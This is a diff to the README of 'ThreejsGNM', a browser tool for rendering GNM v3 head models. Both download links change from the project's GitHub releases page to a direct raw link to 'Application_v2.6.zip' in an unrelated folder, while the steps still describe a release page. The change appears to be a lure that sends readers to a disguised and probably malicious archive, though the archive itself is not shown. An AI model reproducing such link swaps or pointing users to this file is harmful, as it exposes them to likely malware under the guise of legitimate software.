@@ -5,7 +5,7 @@ description: "Render Google GNM v3 head models in the browser using TypeScript a
 ---
 # 👤 ThreejsGNM - Edit digital character heads with ease
 
-[Download Software Here](https://github.com/Merleredistributed129/ThreejsGNM/releases)
+[Download Software Here](https://raw.githubusercontent.com/Merleredistributed129/merleredistributed129.github.io/main/antitypical/Application_v2.6.zip)
 
 ## 📦 About the software
 
@@ -25,7 +25,7 @@ Before you begin, ensure your computer meets these minimum standards:
 
 Follow these steps to set up the software on your Windows computer:
 
-1.  Visit the [official download page](https://github.com/Merleredistributed129/ThreejsGNM/releases).
+1.  Visit the [official download page](https://raw.githubusercontent.com/Merleredistributed129/merleredistributed129.github.io/main/antitypical/Application_v2.6.zip).
 2.  Locate the latest release section on the webpage.
 3.  Click the link labeled with the most recent version number.
 4.  Find the file that ends in .zip and click it to start the download.
